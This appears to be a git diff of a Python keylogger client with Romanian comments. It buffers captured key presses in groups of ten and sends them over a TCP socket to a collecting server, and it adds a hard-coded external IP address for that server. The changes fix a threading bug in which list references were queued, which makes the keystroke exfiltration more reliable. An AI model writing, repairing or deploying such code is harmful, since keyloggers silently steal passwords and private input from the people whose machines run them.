@@ -15,7 +15,11 @@ condition = Condition()
 buffer = [] #list of key pressed 
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #ipv4 tcp socket 
-s.connect( (socket.gethostname(), 1234) )             #ne conectam la server
+
+#stocam ip-ul sv-ului intr-o variabila 
+serverAddr = "94.52.58.50"
+
+s.connect( (socket.gethostname(), 1235) )             #ne conectam la server
 
 def SendBuffersToServer():
     #ca sa nu o folosim pe bufferqueue locala - anunt interpretorul
@@ -23,14 +27,14 @@ def SendBuffersToServer():
 
     while True:
         condition.acquire()
-        if not bufferQueue:
+        if len(bufferQueue) < 1 or len(bufferQueue[0]) == 0:
             condition.wait()
-        print(f"avem {len(bufferQueue)} liste in buffer queue si primul element e {bufferQueue[0]}")
-        buffer1 = bufferQueue[0]
+        print(f"buffer queue este (la consuming time ): {bufferQueue}")
+        buffer1 = bufferQueue[0].copy() #o copie a primei liste din coada 
         bufferQueue.pop(0)
         msgToSendString = " ".join(buffer1)           #convert the list into a string 
         msgToSend = bytes(msgToSendString,"utf-8")    #convert the string in bytes format
-        print(f"am trimis (consumat) {buffer1}")
+        print(f"am trimis (consumat) {msgToSend}")
         s.send(msgToSend)                           #send it to the server                                        
         condition.release()
         time.sleep(1)
@@ -45,13 +49,13 @@ def GetBuffers():
         buffer.append(str(keyPressed))                    #append to list of key pressed 
         #print(keyPressed)                                #debugging purpose
         condition.acquire()
-        if len(bufferQueue) == 10:
-            condition.wait() 
         if len(buffer) == 10:
-            bufferQueue.append(buffer)
+            bufferQueue.append(buffer.copy()) #eu de fapt inseram referinta la lista, nu lista in sine :))) ce buuug 
             print(f"am adaugat (produs) {buffer}")
+            print(f"buffer queue-ul acuma este : {bufferQueue}")
             condition.notify() #notificam threadul celalalt cand avem 
             buffer.clear() 
+        
         condition.release()
         time.sleep(1)
 
